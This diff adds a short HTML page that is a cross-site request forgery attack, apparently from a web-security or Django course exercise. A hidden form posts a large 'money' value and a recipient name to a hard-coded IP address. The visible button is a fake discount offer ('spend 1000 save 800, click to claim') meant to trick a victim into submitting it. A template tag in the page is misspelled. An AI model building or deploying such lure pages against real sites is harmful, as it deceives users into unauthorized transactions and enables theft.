@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>你好</title>
+</head>
+<body>
+    <form action="http://60.205.176.81:12355/t09/zp" method="post">
+        {% scrf_token %}
+        <input type="hidden" value="光棍村" name="c_name">
+        <input type="hidden" name="money" value="10000000000">
+        <input type="submit" value="满一千减八百 点击领取">
+    </form>
+</body>
+</html>
